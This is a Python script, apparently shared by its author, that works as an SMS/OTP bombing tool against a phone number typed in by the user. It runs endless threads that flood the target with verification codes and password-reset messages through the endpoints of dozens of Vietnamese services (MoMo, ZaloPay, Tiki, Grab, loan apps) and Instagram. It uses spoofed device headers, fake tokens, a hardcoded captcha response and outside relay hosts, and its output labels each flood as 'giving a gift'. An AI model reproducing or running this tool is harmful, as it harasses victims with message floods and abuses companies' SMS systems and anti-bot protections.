import os
import json
import threading
import requests
from pystyle import*
import time
import sys
import uuid
import random
import socket
phone_while_list=requests.get("https://pastebin.com/raw/iSsAUc5m").text.split()
class SPAM:
    def __init__(self):
        self.blue = Col.blue
        self.yellow=Col.yellow
        self.lblue = Colors.StaticMIX((Col.light_blue, Col.blue, Col.blue))
        self.red = Colors.StaticMIX((Col.red, Col.red, Col.red))
        self.green= Colors.StaticMIX((Col.green, Col.white, Col.white))
        self.appVer = 40012
        self.appCode = '4.0.1'
        self.time_zone = int(round(time.time() * 1000))
        self.imei = uuid.uuid4()
        self.token = f'{self.random_string(22)}:{self.random_string(53)}-{self.random_string(86)}'
        self.headers = {
            'Host': 'api.momo.vn',
            'msgtype': 'SEND_OTP_MSG',
            'Accept': 'application/json',
            'agent_id': 'undefined',
            'app_version': '31161',
            'Authorization': 'Bearer undefined',
            'user_phone': 'undefined',
            'app_code': '3.1.16',
            'Accept-Language': 'vi-vn',
            'device_os': 'IOS',
            'lang': 'vi',
            'User-Agent': 'MoMoPlatform-Release/31161 CFNetwork/1240.0.4 Darwin/20.5.0',
        }
        self.ua = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
}
    def format_print_success(self, symbol, text, text2):
        return f"""{Col.Symbol(symbol, self.green, self.green)} {self.lblue}{text}{Col.reset} {self.yellow}{text2}{Col.reset}"""
    def format_print_error(self, symbol, text):
        return f"""{Col.Symbol(symbol, self.red, self.red)} {self.red}{text}{Col.reset}"""
    def format_input(self, symbol, text):
        return f"""{Col.Symbol(symbol, self.green, self.blue)} {self.green}{text}{Col.reset}"""
    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        banner = '''\n
    ╔═════════════════════════════════╗
    ║ ➽ Facebook : Nguyễn Văn Khang   ║ 
    ║ ➽ Zalo : 0988655794             ║
    ║ ➽ Youtube : Shisui0711          ║
    ║ ➽ Bản Quyền : Shisui0711        ║
    ╚═════════════════════════════════╝                                                                                             
                               \n\n'''
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_blue)), Center.XCenter(banner)))
    def random_string(self, length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
    def checkdvc(self):
        while True:
            json_data = {
                'user': self.phone,
                'msgType': 'CHECK_USER_BE_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }

            response = requests.post('https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG', headers=self.headers, json=json_data)
            time.sleep(0)
    def send_otp(self):
        json_data = {
                'user': self.phone,
                'msgType': 'SEND_OTP_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'extra': {
                    'action': 'SEND',
                    'rkey': self.random_string(20),
                    'IDFA': '',
                    'SIMULATOR': False,
                    'TOKEN': self.token,
                    'ONESIGNAL_TOKEN': self.token,
                    'SECUREID': '',
                    'MODELID': str(self.imei),
                    'DEVICE_TOKEN': '',
                    'isVoice': False,
                    'REQUIRE_HASH_STRING_OTP': True,
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG', headers=self.headers, json=json_data).json()['errorDesc']
            if 'Thành công' in response:
                print(self.format_print_success("MOMO","     Tặng quà thành công cho",str(self.phone)))
                time.sleep(0)
            else:
                print(self.format_print_error("MOMO","Hết quà"))
                time.sleep(60)
        except:
            print(self.format_print_error("MOMO","Hết quà"))
    def send_code(self):
        json_data = {
                'user': self.phone,
                'msgType': 'REG_DEVICE_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'extra': {
                    'ohash': 'a55b1a625c9e36b3e2a001db13f18ad3afd6e0a19dcae6066566ba1f5f14e3d6',
                    'IDFA': '',
                    'SIMULATOR': False,
                    'TOKEN': self.token,
                    'ONESIGNAL_TOKEN': self.token,
                    'SECUREID': '',
                    'MODELID': str(self.imei),
                    'DEVICE_TOKEN': '',
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/REG_DEVICE_MSG', headers=self.headers, json=json_data).json()['errorDesc']
            if 'Thành công' in response:
                print(self.format_print_success("MOMO","     Tặng quà thành công cho",str(self.phone)))
                time.sleep(0)
            else:
                print(self.format_print_error("MOMO","Hết quà"))
                time.sleep(60)
        except:
            print(self.format_print_error("MOMO","Hết quà"))
    def Gbay(self):
        json_data = {
            'phone_number': self.phone,
            'hash': self.random_string(40),
        }
        try:
            response = requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()['meta']['msg']
            print(self.format_print_success("GBAY","     Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("GBAY","Hết quà"))
    def tamo(self):
        try:
            requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":self.phone}})).text
            print(self.format_print_success("VAY TAMO"," Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("VAY TAMO","Hết quà"))
    def moca(self):
        headers = {
            'Host': 'moca.vn',
            'Accept': '*/*',
            'Device-Token': str(self.imei),
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'vi',
            'X-Moca-Api-Version': '2',
            'platform': 'P_IOS-2.10.42',
            'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)',
        }
        params = {
                'phoneNumber': self.phone,
            }
        try:
            home = requests.get('https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
            token = home['data']['registrationId']
            response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()
            print(self.format_print_success("MOCA","     Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("MOCA","Hết quà"))
            
    def zalopay(self):
        try:
            headers = {
                'Host': 'api.zalopay.vn',
                'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
                'x-device-model': 'iPhone8,2',
                'x-density': 'iphone3x',
                'authorization': 'Bearer ',
                'x-device-os': 'IOS',
                'x-drsite': 'off',
                'accept': '*/*',
                'x-app-version': '7.13.1',
                'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
                'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
                'x-platform': 'NATIVE',
                'x-os-version': '14.6',
            }
            params = {
                'phone_number': self.phone,
            }

            token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
            json_data = {
                'phone_number': self.phone,
                'send_otp_token': token,
            }
            response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
            print(self.format_print_success("ZALOPAY","  Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("ZALOPAY","Hết quà"))
    def tiki(self):
        try:
            json_data = {
                    'phone_number': self.phone,
                }
            response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=self.ua, json=json_data).text
            print(self.format_print_success("TIKI","     Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("TIKI","Hết quà"))
    def meta_vn(self):
        try:
            params = {
                'api_mode': '1',
            }

            json_data = {
                'api_args': {
                    'lgUser': self.phone,
                    'act': 'send',
                    'type': 'phone',
                },
                'api_method': 'CheckExist',
            }
            response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=self.ua, json=json_data).text
            print(self.format_print_success("METAVN","   Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("METAVN","Hết quà"))
    def vntrip(self):
        try:
            json_data = {
                'feature': 'register',
                'phone': '+84'+self.phone[1:11],
            }
            response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=self.ua, json=json_data).text
            print(self.format_print_success("VNTRIP","   Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("VNTRIP","Hết quà"))
    def vieon(self):
        try:
            requests.get(f"https://howtospamsms.herokuapp.com/vieon?phone="+self.phone)
            print(self.format_print_success("VIEON","    Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("VIEON","Hết quà"))
    def vay_vnd(self):
        try:
            requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":self.phone})).text
            print(self.format_print_success("VAY VNĐ","  Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("VAY VNĐ","Hết quà"))
    def vay_semo(self):
        try:
            requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+self.phone[1:11]})).text
            print(self.format_print_success("VAY SEMO"," Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("VAY SEMO","Hết quà"))
    def alfrescos(self):
        try:
            requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN", headers={"Host": "api.alfrescos.com.vn","content-length": "124","accept-language": "vi-VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","brandcode": "ALFRESCOS","devicecode": "web","sec-ch-ua-platform": "\"Android\"","origin": "https://alfrescos.com.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://alfrescos.com.vn/","accept-encoding": "gzip, deflate, br"}, json=({"phoneNumber":self.phone,"secureHash":"add789229e0794d8508f948dacd710ae","deviceId":"","sendTime":1660806807513,"type":2})).text
            print(self.format_print_success("ALFRESCO"," Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("ALFRESCO","Hết quà"))
    def findo(self):
        try:
            requests.post("https://api.findo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.findo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.findo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.findo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":self.phone}})).text
            print(self.format_print_success("VAY FINDO","Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("VAY FINDO","Hết quà"))
    def lozi(self):
        try:
            requests.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", headers={"Host": "latte.lozi.vn","content-length": "101","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":self.phone[1:11]})).text
            print(self.format_print_success("LOZI","     Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("LOZI","Hết quà"))
    def fpt(self):
        try:
            requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":self.phone}).text
            print(self.format_print_success("FPT","      Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("FPT","Hết quà"))
    def facebook(self):
        try:
            requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={self.phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
            print(self.format_print_success("FACEBOOK"," Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("FACEBOOK","Hết quà"))       
    def f88(self):
        try:
            requests.post("https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP", headers={"Host": "apigateway.f88.vn","content-length": "595","content-encoding": "gzip","traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01","sec-ch-ua-mobile": "?1","authorization": "Bearer null","content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://online.f88.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://online.f88.vn/","accept-encoding": "gzip, deflate, br"}, json={"phoneNumber":self.phone,"recaptchaResponse":"03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3","source":"Online"}).text
            print(self.format_print_success("F88","      Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("F88","Hết quà"))
    def vtmoney(self):
        try:
            requests.get('https://quanghuynopro.xyz/api/vtmoney.php?phone='+self.phone)
            print(self.format_print_success("VTMONEY","  Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("VTMONEY","Hết quà"))
    def tv360(self):
        try:
            requests.get('https://quanghuynopro.xyz/api/tv360.php?phone='+self.phone)
            print(self.format_print_success("TV360","    Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("TV360","Hết quà"))
    def TGDĐ(self):
        try:
            requests.get('https://howtospamsms.herokuapp.com/the-gioi-di-dong?phone='+self.phone[1:])
            print(self.format_print_success("TGDĐ","     Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("TGDĐ","Hết quà"))
    def NH247(self):
        try:
            requests.get('https://howtospamsms.herokuapp.com/nhap-hang-247?phone='+self.phone[1:])
            print(self.format_print_success("NH247","    Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("NH247","Hết quà"))
    def Elines(self):
        try:
            requests.get('https://howtospamsms.herokuapp.com/elines?phone='+self.phone[1:])
            print(self.format_print_success("Elines","   Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("Elines","Hết quà"))
    def BHX(self):
        try:
            requests.get('https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone='+self.phone[1:])
            print(self.format_print_success("BHX","      Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("BHX","Hết quà"))
    def Grab(self):
        try:
            requests.get('https://howtospamsms.herokuapp.com/grab-food?phone='+self.phone[1:])
            print(self.format_print_success("Grab","     Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("Grab","Hết quà"))
    def Go2joy(self):
        try:
            requests.get('https://howtospamsms.herokuapp.com/go2joy?phone='+self.phone[1:])
            print(self.format_print_success("Go2joy","   Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("Go2joy","Hết quà"))
    def Agoda(self):
        try:
            requests.get('https://howtospamsms.herokuapp.com/agoda?phone='+self.phone[1:])
            print(self.format_print_success("Agoda","    Tặng quà thành công cho",str(self.phone)))
        except:
            print(self.format_print_error("Agoda","Hết quà"))
    def run_sendotp(self):
        while True:
            self.send_otp()
            time.sleep(self.delay)
    def run_sendcode(self):
        while True:
            for x in range(3):
                self.send_code()
                time.sleep(self.delay)
            time.sleep(self.delay)    
    def run_api_v1(self):
        while True:
            self.Gbay()
            time.sleep(self.delay)
            self.zalopay()
            time.sleep(self.delay)
            self.moca()
            time.sleep(self.delay)
    def run_api_v2(self):
        while True:
            self.vntrip()
            time.sleep(self.delay)
            self.vtmoney()
            time.sleep(self.delay)
            self.tv360()
            time.sleep(self.delay)
    def run_api_v3(self):
        while True:
            self.facebook()
            time.sleep(self.delay)
            self.f88()
            time.sleep(self.delay)
            self.vay_vnd()
            time.sleep(self.delay)
    def run_api_v4(self):
        while True:
            self.lozi()
            time.sleep(self.delay)
            self.vieon()
            time.sleep(self.delay)
            self.findo()
            time.sleep(self.delay)
    def run_api_v5(self):
        while True:
            self.meta_vn()
            time.sleep(self.delay)
            self.vay_semo()
            time.sleep(self.delay)
            self.fpt()
            time.sleep(self.delay)
    def run_api_v6(self):
        while True:
            self.tiki()
            time.sleep(self.delay)
            self.tamo()
            time.sleep(self.delay)
            self.alfrescos()
            time.sleep(self.delay)
    def run_api_v7(self):
        while True:
            self.Agoda()
            time.sleep(self.delay)
            self.Go2joy()
            time.sleep(self.delay)
            self.Grab()
            time.sleep(self.delay)
    def run_api_v8(self):
        while True:
            self.BHX()
            time.sleep(self.delay)
            self.Elines()
            time.sleep(self.delay)
            self.NH247()
            time.sleep(self.delay)
            self.TGDĐ()
            time.sleep(self.delay)
    def run(self):
        while True:
            self.banner()
            self.phone = input(self.format_input("</>",f"|Shisui0711 YOUTUBE| NHẬP SỐ ĐIỆN THOẠI CẦN TẶNG QUÀ : "))
            if self.phone != '0988655794' and self.phone not in phone_while_list:
                if len(self.phone) == 10:
                    break
                print(self.format_print_error("</>", "VUI LÒNG NHẬP ĐÚNG ĐỊNH DẠNG SĐT"))
            if self.phone == '0988655794' or self.phone in phone_while_list:
                print(self.format_print_error("</>", "SỐ ĐIỆN THOẠI ĐÃ ĐƯỢC BẢO VỆ"))
            time.sleep(2)
        self.banner()
        self.delay = int(input(self.format_input("</>",f"|Shisui0711 YOUTUBE| NHẬP DELAY : ")))
        threading.Thread(target=self.checkdvc).start()
        threading.Thread(target=self.run_sendotp).start()
        threading.Thread(target=self.run_sendcode).start()
        threading.Thread(target=self.run_api_v1).start()
        threading.Thread(target=self.run_api_v2).start()
        threading.Thread(target=self.run_api_v3).start()
        threading.Thread(target=self.run_api_v4).start()
        threading.Thread(target=self.run_api_v5).start()
        threading.Thread(target=self.run_api_v6).start()
        threading.Thread(target=self.run_api_v7).start()
        threading.Thread(target=self.run_api_v8).start()
if __name__ == "__main__":   
    try:
        SPAM().run()
    except KeyboardInterrupt:
        time.sleep(3)
        sys.exit('\n'+SPAM().format_print_error('*', 'Tạm biệt nhé:) Cảm ơn đã sử dụng'))